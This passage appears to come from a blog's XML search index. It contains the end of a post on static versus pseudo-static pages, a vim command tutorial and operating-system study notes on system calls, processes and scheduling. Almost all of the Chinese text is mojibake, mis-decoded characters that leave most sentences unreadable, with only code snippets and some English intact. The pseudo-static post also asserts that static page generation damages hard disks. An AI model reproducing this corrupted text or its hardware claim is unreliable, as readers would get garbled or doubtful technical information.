æ¥è¯´æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼›</p><p>2ã€ä½¿ç”¨é™æ€å¯èƒ½ä¼šå¯¼è‡´ç¡¬ç›˜æŸåå¹¶ä¸”å½±å“ç«™ç‚¹æ€§èƒ½ï¼›</p><p>3ã€ä½¿ç”¨ä¼ªé™æ€ä¼šå ç”¨ä¸€å®šé‡çš„ CPU å æœ‰ç‡ï¼Œå¤§é‡ä½¿ç”¨ä¼šå¯¼è‡´ CPUè¶…è´Ÿè·ï¼›</p><p>4ã€é™æ€çš„è®¿é—®é€Ÿåº¦æ¯”ä¼ªé™æ€çš„è®¿é—®é€Ÿåº¦è¦é«˜ã€‚</p><p>æ‰€ä»¥ï¼š</p><p>1ã€ä½¿ç”¨é™æ€çš„æ–¹æ³•å¯ä»¥ç›´æ¥æ’é™¤ï¼Œå› ä¸ºæ— è®ºæ€ä¹ˆç”Ÿæˆï¼Œå¯¹ç¡¬ç›˜æ¥è¯´éƒ½æ˜¯å¾ˆå¤§çš„ä¼¤å®³ï¼›</p><p>2ã€æ—¢ç„¶çœŸä¼ªé™æ€çš„æ•ˆæœä¸€æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€‰æ‹©ä¼ªé™æ€äº†ï¼›</p><p>3ã€ä½†æ˜¯ä¼ªé™æ€å¤§é‡ä½¿ç”¨ä¼šé€ æˆ CPU è¶…è´Ÿè·ï¼›</p><p>4ã€æ‰€ä»¥æˆ‘ä»¬åªè¦ä¸å¤§é‡ä½¿ç”¨å°±å¯ä»¥äº†ï¼›</p><p>5ã€æ—¢ç„¶ä¼ªé™æ€åªæ˜¯ç»™æœç´¢å¼•æ“çˆ¬è™«çœ‹çš„ï¼Œæˆ‘ä»¬åªéœ€è¦ä¼ªé™æ€ç»™æœç´¢å¼•æ“çˆ¬è™«å°±è¡Œäº†ï¼Œä¸éœ€è¦ç»™ç”¨æˆ·ä½¿ç”¨ï¼›</p><p>6ã€æ‰€ä»¥æˆ‘ä»¬åªè¦åœ¨ä¸“é—¨æä¾›ç»™æœç´¢å¼•æ“çˆ¬è™«ï¼ˆæœç´¢å¼•æ“æœºå™¨äººï¼‰çˆ¬çš„Archiver ä¸­ä½¿ç”¨ä¼ªé™æ€å°±å¯ä»¥äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pseudo static </tag>
            
            <tag> sql injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim å…¥é—¨ç®€å•ä½¿ç”¨</title>
      <link href="/blog/2020/02/13/linux/tools/vim/"/>
      <url>/blog/2020/02/13/linux/tools/vim/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸‰ç§æ¨¡å¼">ä¸‰ç§æ¨¡å¼</h2><ul><li><strong>Insert mode</strong>Â is where you insert i.e. write thetext.</li><li><strong>NormalÂ mode</strong>Â is where you can run commands. This isthe default mode in whichÂ  Vim starts up.</li><li><strong>Visual mode</strong>Â is where you visually select a bunch oftext, so that you can run a command/operation only on that part of thetext.</li></ul><h3 id="insert-æ¨¡å¼">insert æ¨¡å¼</h3><p>normal mode â†’ insert modeï¼š</p><ol type="1"><li>æŒ‰ä¸‹ <code>i</code> è¡¨ç¤º insertï¼Œ æ’å…¥ä¸œè¥¿åˆ°å…‰æ ‡å‰</li><li>æŒ‰ä¸‹ <code>I</code> è¡¨ç¤º insert before lineï¼Œæ’å…¥ä¸œè¥¿åˆ°å½“å‰è¡Œé¦–</li><li>æŒ‰ä¸‹ <code>a</code>ï¼Œè¡¨ç¤º appendï¼Œ è¿½åŠ ä¸œè¥¿åˆ°å…‰æ ‡å</li><li>æŒ‰ä¸‹ <code>A</code>ï¼Œè¡¨ç¤º appendï¼Œ è¿½åŠ ä¸œè¥¿åˆ°å½“å‰è¡Œå°¾</li><li>æŒ‰ä¸‹ <code>o</code>ï¼Œ è¡¨ç¤º open a line belowï¼Œ åœ¨ä¸‹é¢æ–°å»ºä¸€è¡Œã€‚</li><li>æŒ‰ä¸‹ <code>O</code>ï¼Œ è¡¨ç¤º open a line aboveï¼Œ åœ¨ä¸Šé¢æ–°å»ºä¸€è¡Œã€‚</li></ol><p>Esc ï¼šInsert mode â†’ Normal mode</p><p><code>:wq</code> å†™å…¥å¹¶é€€å‡º( write and quit )</p><h3 id="normal-æ¨¡å¼">Normal æ¨¡å¼</h3><p>è¾“å…¥<code>:</code> åï¼Œè¿›å…¥å‘½ä»¤æ¨¡å¼</p><p><code>:vs</code> (vertical split)</p><p><code>:sp</code> (split)</p><p><code>:% s/foo/bar/g</code> å…¨å±€æ›¿æ¢</p><p><code>:set nu!</code> è®¾ç½®è¡Œå·</p><p>å‘½ä»¤æ¨¡å¼ä¸‹ï¼Œä¸å°å¿ƒæŒ‰é”™å‘½ä»¤ï¼Œå¯ä»¥æŒ‰ Esc æ¶ˆé™¤å‘½ä»¤</p><p>å¤åˆ¶ä¸€è¡Œï¼š<code>yy</code></p><p>å¤åˆ¶ n è¡Œï¼š<code>nyy</code></p><p>ä¹Ÿå¯è¿›å…¥ visual æ¨¡å¼ï¼Œé€‰æ‹©å¤šè¡Œï¼Œç„¶å <code>yy</code></p><ol type="1"><li><p>é€‰å®šæ–‡æœ¬å—ã€‚ä½¿ç”¨ v è¿›å…¥å¯è§†æ¨¡å¼ï¼Œç§»åŠ¨å…‰æ ‡é”®é€‰å®šå†…å®¹ã€‚</p></li><li><p>å¤åˆ¶çš„å‘½ä»¤æ˜¯ <code>y</code>ï¼Œå³ yankï¼ˆæèµ·ï¼‰ï¼Œå¸¸ç”¨çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p><p><code>y</code>: åœ¨ä½¿ç”¨ væ¨¡å¼é€‰å®šäº†æŸä¸€å—çš„æ—¶å€™ï¼Œå¤åˆ¶é€‰å®šå—åˆ°ç¼“å†²åŒºç”¨ï¼›</p><p><code>yy</code>: å¤åˆ¶æ•´è¡Œï¼ˆ<code>nyy</code> æˆ–è€… <code>yny</code>ï¼Œå¤åˆ¶ n è¡Œï¼Œn ä¸ºæ•°å­—ï¼‰ï¼›</p><p><code>y^</code>: å¤åˆ¶å½“å‰åˆ°è¡Œå¤´çš„å†…å®¹ï¼›</p><p><code>y$</code>: å¤åˆ¶å½“å‰åˆ°è¡Œå°¾çš„å†…å®¹ï¼›</p><p><code>yw</code>: å¤åˆ¶ä¸€ä¸ª word ï¼ˆ<code>nyw</code> æˆ–è€…<code>ynw</code>ï¼Œå¤åˆ¶ n ä¸ª wordï¼Œn ä¸ºæ•°å­—ï¼‰ï¼›</p><p><code>yG</code>: å¤åˆ¶è‡³æ¡£å°¾ï¼ˆ<code>nyG</code> æˆ–è€…<code>ynG</code>ï¼Œå¤åˆ¶åˆ°ç¬¬ n è¡Œï¼Œä¾‹å¦‚ 1yG æˆ–è€…y1Gï¼Œå¤åˆ¶åˆ°æ¡£å°¾ï¼‰</p></li><li><p>åˆ é™¤çš„å‘½ä»¤æ˜¯ <code>d</code>ï¼Œå³ deleteï¼Œ<code>d</code> ä¸<code>y</code> å‘½ä»¤åŸºæœ¬ç±»ä¼¼ï¼Œæ‰€ä»¥ä¸¤ä¸ªå‘½ä»¤ç”¨æ³•ä¸€æ ·ï¼ŒåŒ…æ‹¬å«æœ‰æ•°å­—çš„ç”¨æ³•. dåˆ é™¤é€‰å®šå—åˆ°ç¼“å†²åŒºï¼›</p><p><code>dd</code>: å‰ªåˆ‡æ•´è¡Œ</p><p><code>ndd</code>: å‘åå‰ªåˆ‡ n è¡Œï¼ˆåŒ…å«æ‰€åœ¨è¡Œï¼‰</p><p><code>d^</code>: å‰ªåˆ‡è‡³è¡Œé¦–</p><p><code>d$</code> æˆ– <code>G</code>: å‰ªåˆ‡è‡³è¡Œå°¾</p><p><code>dw</code>: å‰ªåˆ‡ä¸€ä¸ª word</p><p><code>dG</code>: å‰ªåˆ‡è‡³æ–‡æ¡£å°¾</p><p>åˆ é™¤çš„å‘½ä»¤ <code>c</code> è·Ÿ <code>d</code>ç±»ä¼¼ï¼Œä½†æ˜¯åˆ é™¤å®Œæˆåä¼šè¿›å…¥æ’å…¥æ¨¡å¼</p></li><li><p>ç²˜è´´çš„å‘½ä»¤å¼ <code>p</code>ï¼Œå³ pasteï¼ˆæ”¾ä¸‹ï¼‰</p><p>å°å†™ <code>p</code> å‘åç²˜è´´,ä»£è¡¨è´´è‡³æ¸¸æ ‡åï¼ˆä¸‹ï¼‰ï¼Œå› ä¸ºæ¸¸æ ‡æ˜¯åœ¨å…·ä½“å­—ç¬¦çš„ä½ç½®ä¸Šï¼Œæ‰€ä»¥å®é™…æ˜¯åœ¨è¯¥å­—ç¬¦çš„åé¢.</p><p>å¤§å†™ <code>P</code> å‘å‰ç²˜è´´,ä»£è¡¨è´´è‡³æ¸¸æ ‡å‰ï¼ˆä¸Šï¼‰</p><p>æ•´è¡Œçš„å¤åˆ¶ç²˜è´´åœ¨æ¸¸æ ‡çš„ä¸Šä¸€è¡Œï¼Œéæ•´è¡Œçš„å¤åˆ¶åˆ™æ˜¯ç²˜è´´åœ¨æ¸¸æ ‡çš„å‰</p></li></ol><p>æ³¨ï¼š åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œ<code>^</code>è¡¨ç¤ºåŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ï¼Œ<code>$</code> è¡¨ç¤ºåŒ¹é…å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®ã€‚å‘½ä»¤å‰é¢åŠ æ•°å­—è¡¨ç¤ºé‡å¤çš„æ¬¡æ•°ï¼ŒåŠ å­—æ¯è¡¨ç¤ºä½¿ç”¨çš„ç¼“å†²åŒºåç§°ã€‚ä½¿ç”¨è‹±æ–‡å¥å·"."å¯ä»¥é‡å¤ä¸Šä¸€ä¸ªå‘½ä»¤ã€‚åœ¨å¤åˆ¶ç²˜è´´æ—¶ï¼Œå¦ä¸€ç»„å¸¸ç”¨çš„å‘½ä»¤æ˜¯<code>u</code>ï¼ˆæ’¤é”€æ“ä½œï¼‰ï¼Œ<code>U</code>ï¼ˆæ’¤é”€æŸä¸€è¡Œæœ€è¿‘æ‰€æœ‰ä¿®æ”¹ï¼‰ï¼Œ<code>Ctrl+R</code>ï¼ˆé‡åšï¼‰ï¼Œè¿™äº›åŠŸèƒ½ä¸»è¦æ˜¯vim ä¸­çš„ï¼Œvi ä¸­ç•¥æœ‰å·®åˆ«</p><h2 id="åˆ é™¤æ‰€æœ‰å†…å®¹">åˆ é™¤æ‰€æœ‰å†…å®¹</h2><p>å‘½ä»¤ä¸ºï¼š<code>ggdG</code></p><p>è®²è§£ï¼š<code>gg</code> ä¸ºè·³è½¬åˆ°æ–‡ä»¶é¦–è¡Œï¼›<code>dG</code>ä¸ºåˆ é™¤å…‰æ ‡æ‰€åœ¨è¡Œä»¥åŠå…¶ä¸‹æ‰€æœ‰è¡Œçš„å†…å®¹ï¼Œå…¶ä¸­ <code>d</code>ä¸ºåˆ é™¤ï¼Œ<code>G</code> ä¸ºè·³è½¬åˆ°æ–‡ä»¶æœ«å°¾è¡Œï¼›</p><p>åˆ é™¤åˆ°æŸä¸€è¡Œ: <code>d63G</code> delete from the current line untilline 63.</p><h3 id="ç§»åŠ¨">ç§»åŠ¨</h3><p><code>home</code> é”® è¡Œé¦–ã€<code>end</code> é”® è¡Œå°¾ã€</p><p><code>h</code> å‘å·¦ã€<code>j</code> å‘ä¸‹ã€<code>k</code>æ˜¯å‘ä¸Šã€<code>l</code> æ˜¯å‘å³</p><p>å‘ä¸‹è·³ 10 è¡Œï¼š<code>10j</code></p><p>å‘ä¸Šè·³ 10 è¡Œï¼š<code>10k</code></p><p>å‘ä¸Šç¿»é¡µï¼š<code>pgup</code> æˆ–è€… <code>ctrl + b(backwad)</code></p><p>å‘ä¸‹ç¿»é¡µ: <code>pgdn</code> æˆ–è€… <code>ctrl +f ï¼ˆforwardï¼‰</code></p><p>æŒ‰å•è¯å‘åç§»åŠ¨ ï¼š w (word)</p><p>æŒ‰å•è¯å¾€å›ç§»åŠ¨ï¼šb ï¼ˆbackï¼‰</p><h2 id="vim-å¿«é€Ÿç§»åŠ¨å…‰æ ‡è‡³è¡Œé¦–å’Œè¡Œå°¾">Vim å¿«é€Ÿç§»åŠ¨å…‰æ ‡è‡³è¡Œé¦–å’Œè¡Œå°¾</h2><ol type="1"><li><p>éœ€è¦æŒ‰è¡Œå¿«é€Ÿç§»åŠ¨å…‰æ ‡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨é”®ç›˜ä¸Šçš„ç¼–è¾‘é”®<code>home</code>ï¼Œå¿«é€Ÿå°†å…‰æ ‡ç§»åŠ¨è‡³å½“å‰è¡Œçš„è¡Œé¦–ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥åœ¨å‘½ä»¤æ¨¡å¼ä¸­ä½¿ç”¨å¿«æ·é”®<code>^</code>ï¼ˆå³ <code>Shift+6</code>ï¼‰æˆ– <code>0</code>ï¼ˆæ•°å­—0ï¼‰ã€‚</p></li><li><p>å¦‚æœè¦å¿«é€Ÿç§»åŠ¨å…‰æ ‡è‡³å½“å‰è¡Œçš„è¡Œå°¾ï¼Œå¯ä»¥ä½¿ç”¨ç¼–è¾‘é”®Endã€‚ä¹Ÿå¯ä»¥åœ¨å‘½ä»¤æ¨¡å¼ä¸­ä½¿ç”¨å¿«æ·é”® <code>$ï¼ˆShift+4ï¼‰</code>ã€‚ä¸å¿«æ·é”®<code>^</code> å’Œ <code>0</code> ä¸åŒï¼Œå¿«æ·é”® <code>$</code>å‰å¯ä»¥åŠ ä¸Šæ•°å­—è¡¨ç¤ºç§»åŠ¨çš„è¡Œæ•°ã€‚ä¾‹å¦‚ä½¿ç”¨"1$"è¡¨ç¤ºå½“å‰è¡Œçš„è¡Œå°¾ï¼Œ<code>2$</code>è¡¨ç¤ºå½“å‰è¡Œçš„ä¸‹ä¸€è¡Œçš„è¡Œå°¾ã€‚</p></li></ol><h2 id="vim-è·³è½¬åˆ°æŒ‡å®šè¡Œ">vim è·³è½¬åˆ°æŒ‡å®šè¡Œ</h2><ol type="1"><li><p><code>ngg æˆ– nG</code>ï¼Œå…¶ä¸­ n æ˜¯æƒ³è·³è½¬åˆ°çš„è¡Œæ ‡ï¼Œå¦‚ 10ggï¼Œæˆ–10Gï¼Œä½†è¿™ç§æ–¹å¼è¾“å…¥æ—¶ä¸æ˜¾ç¤ºæ‰€è¾“å†…å®¹ï¼Œä¸ªäººæ„Ÿè§‰ä¸å¤Ÿç›´è§‚ã€‚</p></li><li><p><code>:n</code>ï¼Œåœ¨ä¸€èˆ¬æ¨¡å¼ä¸‹æŒ‰å†’å·è¿›å…¥å‘½ä»¤æ¨¡å¼ï¼Œç›´æ¥è¾“è¡Œæ ‡ï¼Œç„¶åå›è½¦ã€‚è¿™ç§æ–¹æ³•ç›´æ¥æ˜¾ç¤ºæ‰€è¾“å†…å®¹ã€‚</p></li><li><p>ä¸€èˆ¬æ¨¡å¼ä¸‹ç›´æ¥è¾“å…¥<code>H</code>ç§»åŠ¨åˆ°å½“å‰å±å¹•ç¬¬ä¸€è¡Œï¼ˆhomeï¼‰ï¼›<code>M</code>ç§»åŠ¨åˆ°å½“å‰å±å¹•ä¸­é—´ä¸€è¡Œï¼ˆmiddleï¼‰;<code>L</code>ç§»åŠ¨åˆ°å½“å‰å±å¹•æœ€åä¸€è¡Œï¼ˆlastï¼‰ã€‚</p></li></ol><h3 id="æœç´¢">æœç´¢</h3><p>è¾“å…¥<code>/</code>ï¼Œç„¶åè¾“å…¥è¦æœç´¢çš„ä¸œè¥¿ï¼Œ<strong>å¹¶å›è½¦</strong>å³å¯ã€‚</p><p>æŸ¥çœ‹ä¸Šä¸€ä¸ªåŒ¹é…ä½ç½®ï¼š<code>shift + n</code></p><p>æŸ¥çœ‹ä¸‹ä¸€ä¸ªåŒ¹é…ä½ç½®ï¼š<code>n</code></p><p><a href="https://harttle.land/2016/08/08/vim-search-in-file.html">åœ¨Vim ä¸­ä¼˜é›…åœ°æŸ¥æ‰¾å’Œæ›¿æ¢ Vim-Practice</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ“ä½œç³»ç»ŸçŸ¥è¯†ç‚¹å°ç»“</title>
      <link href="/blog/2020/01/09/os/os/"/>
      <url>/blog/2020/01/09/os/os/</url>
      
        <content type="html"><![CDATA[<h2 id="os">OS</h2><p>æ“ä½œç³»ç»Ÿçš„åŠŸèƒ½ï¼šå¤„ç†æœºç®¡ç†ã€å†…å­˜ç®¡ç†ã€æ–‡ä»¶ç®¡ç†ã€è®¾å¤‡ç®¡ç†ã€æä¾›çš„ç”¨æˆ·æ¥å£ï¼ˆäººæœºäº¤äº’ï¼‰</p><p>æ“ä½œç³»ç»Ÿæ ¸å¿ƒä½¿ç”¨çš„åŒæ­¥æŠ€æœ¯ï¼š</p><ol type="1"><li>åŸå­æ“ä½œ</li><li>ä¿¡å·é‡</li><li>è‡ªæ—‹é”</li><li>å…³ä¸­æ–­</li></ol><h2 id="ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„è½¬æ¢">ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„è½¬æ¢</h2><h3 id="a.ç³»ç»Ÿè°ƒç”¨">a.ç³»ç»Ÿè°ƒç”¨</h3><p>è¿™æ˜¯ç”¨æˆ·è¿›ç¨‹ä¸»åŠ¨è¦æ±‚åˆ‡æ¢åˆ°å†…æ ¸æ€çš„ä¸€ç§æ–¹å¼ï¼Œç”¨æˆ·è¿›ç¨‹é€šè¿‡ç³»ç»Ÿè°ƒç”¨ç”³è¯·æ“ä½œç³»ç»Ÿæä¾›çš„æœåŠ¡ç¨‹åºå®Œæˆå·¥ä½œã€‚</p><p>è€Œç³»ç»Ÿè°ƒç”¨çš„æœºåˆ¶å…¶æ ¸å¿ƒè¿˜æ˜¯ä½¿ç”¨äº†å¤šå°‘æ“ä½œç³»ç»Ÿä¸ºç”¨æˆ·ç‰¹åˆ«å¼€æ”¾çš„ä¸€ä¸ªä¸­æ–­æ¥å®ç°ï¼Œä¾‹å¦‚Linux çš„ ine 80h ä¸­æ–­ã€‚</p><h3 id="b.å¼‚å¸¸">b.å¼‚å¸¸</h3><p>å½“ CPUåœ¨æ‰§è¡Œè¿è¡Œåœ¨ç”¨æˆ·æ€çš„ç¨‹åºæ—¶ï¼Œå‘ç°äº†æŸäº›äº‹ä»¶ä¸å¯çŸ¥çš„å¼‚å¸¸ï¼Œè¿™æ˜¯ä¼šè§¦å‘ç”±å½“å‰è¿è¡Œè¿›ç¨‹åˆ‡æ¢åˆ°å¤„ç†æ­¤å¼‚å¸¸çš„å†…æ ¸ç›¸å…³ç¨‹åºä¸­ï¼Œä¹Ÿå°±åˆ°äº†å†…æ ¸æ€ï¼Œæ¯”å¦‚ç¼ºé¡µå¼‚å¸¸, é™¤ 0 å¼‚å¸¸</p><h3 id="c.å¤–å›´è®¾å¤‡çš„ä¸­æ–­">c.å¤–å›´è®¾å¤‡çš„ä¸­æ–­</h3><p>å½“å¤–å›´è®¾å¤‡å®Œæˆç”¨æˆ·è¯·æ±‚çš„æ“ä½œä¹‹åï¼Œä¼šå‘ CPU å‘å‡ºç›¸åº”çš„ä¸­æ–­ä¿¡å·ï¼Œè¿™æ—¶CPU ä¼šæš‚åœæ‰§è¡Œä¸‹ä¸€æ¡å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤è½¬è€Œå»æ‰§è¡Œä¸­æ–­ä¿¡å·çš„å¤„ç†ç¨‹åºï¼Œå¦‚æœå…ˆæ‰§è¡Œçš„æŒ‡ä»¤æ˜¯ç”¨æˆ·æ€ä¸‹çš„ç¨‹åºï¼Œé‚£ä¹ˆè¿™ä¸ªè½¬æ¢çš„è¿‡ç¨‹è‡ªç„¶ä¹Ÿå°±å‘ç”Ÿäº†æœ‰ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„åˆ‡æ¢ã€‚æ¯”å¦‚<strong>ç¡¬ç›˜è¯»å†™</strong>æ“ä½œå®Œæˆï¼Œç³»ç»Ÿä¼šåˆ‡æ¢åˆ°ç¡¬ç›˜è¯»å†™çš„ä¸­æ–­å¤„ç†ç¨‹åºä¸­æ‰§è¡Œåç»­æ“ä½œç­‰ã€‚æ¯”å¦‚ï¼šIOä¸­æ–­ï¼šè¯»å†™å†…å­˜æ•°æ®ã€‚</p><h3 id="æ€»ç»“">æ€»ç»“</h3><p><strong>ç³»ç»Ÿè°ƒç”¨çš„æœ¬è´¨å…¶å®ä¹Ÿæ˜¯ä¸­æ–­</strong>ï¼Œ<strong>ç›¸å¯¹äºå¤–å›´è®¾å¤‡çš„ç¡¬ä¸­æ–­ï¼Œè¿™ç§ä¸­æ–­ç§°ä¸ºè½¯ä¸­æ–­</strong>ã€‚ä»è§¦å‘æ–¹å¼å’Œæ•ˆæœä¸Šæ¥çœ‹ï¼Œè¿™ä¸‰ç§åˆ‡æ¢æ–¹å¼æ˜¯å®Œå…¨ä¸€æ ·çš„ï¼Œéƒ½ç›¸å½“äºæ˜¯æ‰§è¡Œäº†ä¸€ä¸ªä¸­æ–­å“åº”çš„è¿‡ç¨‹ã€‚ä½†æ˜¯ä»è§¦å‘çš„å¯¹è±¡æ¥çœ‹ï¼Œ<strong>ç³»ç»Ÿè°ƒç”¨æ˜¯è¿›ç¨‹ä¸»åŠ¨è¯·æ±‚åˆ‡æ¢çš„ï¼Œè€Œå¼‚å¸¸å’Œç¡¬ä¸­æ–­åˆ™æ˜¯è¢«åŠ¨çš„ã€‚</strong></p><h3 id="è¿›ç¨‹çš„æè¿°ä¸æ§åˆ¶">è¿›ç¨‹çš„æè¿°ä¸æ§åˆ¶</h3><ol type="1"><li><p>å¦‚æœé€‰æ‹©é¢˜è¯´â€œè¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿè¿›è¡Œè°ƒåº¦å’Œèµ„æºåˆ†é…çš„åŸºæœ¬å•ä½ã€‚â€ï¼Œé‚£çœ‹é¢˜ç›®æƒ…æ™¯ï¼Œå¯ä»¥å…ˆçœ‹åˆ«çš„é€‰é¡¹ã€‚</p></li><li><p>è¿›ç¨‹çš„ä¸¤ä¸ªåŸºæœ¬å…ƒç´ æ˜¯ç¨‹åºä»£ç å’Œä¸ä»£ç ç›¸å…³çš„æ•°æ®é›†ã€‚</p><p>è¿›ç¨‹ï¼ˆçš„å®ä½“ï¼‰ç”±ç¨‹åºã€æ•°æ®å’Œè¿›ç¨‹æ§åˆ¶å—ï¼ˆPCBï¼‰ä¸‰éƒ¨åˆ†ç»„æˆã€‚</p></li><li><p>ä¸€å®šä¼šå¼•èµ·è¿›ç¨‹åˆ‡æ¢çš„ï¼š</p><ul><li><p>æ—¶é—´ç‰‡ç»“æŸ</p></li><li><p>ä»ç£ç›˜å­˜å–æ•°æ®</p></li><li><p>è¿›ç¨‹è¢«æ¢å‡ºåˆ° swap åˆ†åŒº</p><p>è¿›ç¨‹åˆ‡æ¢ä¸€å®šä¼šæ¶‰åŠæ¨¡å¼åˆ‡æ¢ï¼ˆéœ€è¦ç³»ç»Ÿè°ƒç”¨ï¼‰ï¼Œæ¨¡å¼åˆ‡æ¢ä¸ä¸€å®šæ¶‰åŠè¿›ç¨‹åˆ‡æ¢ã€‚</p></li></ul></li><li><p>çº¿ç¨‹æ˜¯ç‹¬ç«‹è°ƒåº¦å’Œåˆ†æ´¾ï¼ˆdispatchï¼‰çš„å•ä½ï¼Œè¿›ç¨‹æ˜¯èµ„æºåˆ†é…ï¼ˆallocationï¼‰/æ‹¥æœ‰ï¼ˆownï¼‰çš„å•ä½</p></li><li><p>æ“ä½œç³»ç»Ÿä¸­ï¼Œè¿›ç¨‹ä¸ç¨‹åºçš„é‡è¦åŒºåˆ«ä¹‹ä¸€æ˜¯è¿›ç¨‹æœ‰çŠ¶æ€è€Œç¨‹åºæ²¡æœ‰ã€‚</p><p>è¿›ç¨‹æ˜¯ä¸€ä¸ªâ€œæ‰§è¡Œä¸­çš„ç¨‹åºâ€ï¼Œæ‰€ä»¥è¿›ç¨‹æ˜¯æœ‰çŠ¶æ€çš„ï¼Œè€Œç¨‹åºåªæ˜¯ä¸€ä¸ªé™æ€çš„æ¦‚å¿µï¼Œå¹¶ä¸å­˜åœ¨çŠ¶æ€ã€‚</p></li><li><p>ä¸€ä¸ªç¨‹åºè¢«åŒæ—¶æ‰§è¡Œå¤šæ¬¡ï¼Œç³»ç»Ÿå°±ä¼šåˆ›å»ºå¤šä¸ªè¿›ç¨‹ã€‚å› æ­¤ï¼Œä¸€ä¸ªç¨‹åºå¯ä»¥è¢«å¤šä¸ªè¿›ç¨‹æ‰§è¡Œã€‚</p><p>ä¸€ä¸ªè¿›ç¨‹ä¹Ÿå¯ä»¥åŒæ—¶æ‰§è¡Œå¤šä¸ªç¨‹åºã€‚</p><p>è¿›ç¨‹ä¸ç¨‹åºå¹¶ä¸æ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚</p></li><li><p>åˆ›å»ºæ–°è¿›ç¨‹çš„æƒ…å†µï¼š</p><ol type="1"><li><p>æ–°çš„æ‰¹å¤„ç†ä½œä¸š</p></li><li><p>äº¤äº’ç™»å½•</p></li><li><p>ä¸ºæä¾›æœåŠ¡è€Œç”±æ“ä½œç³»ç»Ÿåˆ›å»º</p></li><li><p>ç”±ç°æœ‰è¿›ç¨‹æ´¾ç”Ÿ</p><p>å¼•èµ·åˆ›å»ºè¿›ç¨‹çš„äº‹ä»¶ï¼š</p><p>1ã€ç”¨æˆ·ç™»å½•</p><p>2ã€ä½œä¸šè°ƒåº¦</p><p>3ã€æä¾›æœåŠ¡ï¼ˆç”¨æˆ·ç¨‹åºæå‡ºè¯·æ±‚ï¼‰</p><p>4ã€åº”ç”¨è¯·æ±‚ï¼ˆåŸºäºåº”ç”¨è¿›ç¨‹çš„éœ€æ±‚ï¼‰</p><p>è®¾å¤‡åˆ†é…åªéœ€è¦åˆ†é…ç›¸åº”çš„ç«¯å£ï¼Œæœ‰äº‹ä»¶å‘ç”Ÿæ—¶è¿›è¡Œä¸­æ–­å³å¯ï¼Œä¸éœ€è¦é¢å¤–çš„è¿›ç¨‹ç®¡ç†ã€‚</p></li></ol></li><li><p>è¿›ç¨‹çš„é«˜çº§é€šä¿¡æœºåˆ¶ï¼š</p><p>å…±äº«å­˜å‚¨å™¨ç³»ç»Ÿã€æ¶ˆæ¯ä¼ é€’ã€ç®¡é“é€šä¿¡</p></li><li><p>è¿›ç¨‹æ§åˆ¶å—ä¿¡æ¯åˆ†ä¸ºä¸‰ç±»ï¼š</p><ol type="1"><li>è¿›ç¨‹æ ‡è¯†ä¿¡æ¯</li><li>å¤„ç†æœºçŠ¶æ€ä¿¡æ¯</li><li>è¿›ç¨‹æ§åˆ¶ä¿¡æ¯</li></ol></li><li><p>åœ¨è¿›ç¨‹çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…ï¼Œç³»ç»Ÿæ€»æ˜¯é€šè¿‡ PCBå¯¹è¿›ç¨‹è¿›è¡Œæ§åˆ¶å’Œç®¡ç†ã€‚</p></li></ol><h2 id="è¿›ç¨‹è°ƒåº¦">è¿›ç¨‹è°ƒåº¦</h2><ol type="1"><li><p>åŸºäºæŠ¢å ç­–ç•¥è¿›ç¨‹è°ƒåº¦ç®—æ³•ï¼š</p><p>æ—¶é—´ç‰‡è½®è½¬ï¼ˆæ—¶é—´ç‰‡ç”¨å°½ï¼‰</p><p>æœ€çŸ­å‰©ä½™æ—¶é—´ SRTï¼š åœ¨ SPN ä¸­å¢åŠ äº†æŠ¢å çš„ç­–ç•¥</p><p>å¤šçº§åé¦ˆé˜Ÿåˆ—ä¼˜å…ˆï¼šæŠ¢å ï¼ˆæ—¶é—´ç‰‡ç”¨å°½ï¼‰</p></li><li><p>åšå¤§é¢˜ä¸€èˆ¬æ±‚å¹³å‡å‘¨è½¬æ—¶é—´ä»¥åŠå¹³å‡å¸¦æƒå‘¨è½¬æ—¶é—´æ—¶ï¼Œç”»è¡¨æ ¼</p><p>å‡è®¾æœ‰ n ä¸ªè¿›ç¨‹ï¼Œåˆ™ç”»ä¸€ä¸ª ï¼ˆn +3ï¼‰åˆ—çš„è¡¨æ ¼ã€‚å¤šå‡ºçš„åˆ—åˆ†åˆ«ä¸ºï¼šç®—æ³•ã€æ—¶é—´åç§°ï¼ˆåˆ°è¾¾æ—¶é—´ã€æœåŠ¡æ—¶é—´ã€å®Œæˆæ—¶é—´ã€å‘¨è½¬æ—¶é—´ã€å¸¦æƒå‘¨è½¬æ—¶é—´ï¼‰ã€å¹³å‡</p><p>æ¯ä¸ªç®—æ³•å¯¹åº”ä¸‰è¡Œï¼šå®Œæˆæ—¶é—´ã€å‘¨è½¬æ—¶é—´ã€å¸¦æƒå‘¨è½¬æ—¶é—´ã€‚</p></li><li><p>æœ€é«˜å“åº”æ¯”ä¼˜å…ˆ HRRN è§£å†³äº†é•¿ä½œä¸šæ­»ç­‰é—®é¢˜</p><p>é•¿ä½œä¸šç”±äºå¾—ä¸åˆ°æœåŠ¡ï¼Œç­‰å¾…çš„æ—¶é—´ä¼šä¸æ–­å¢åŠ ï¼Œå› 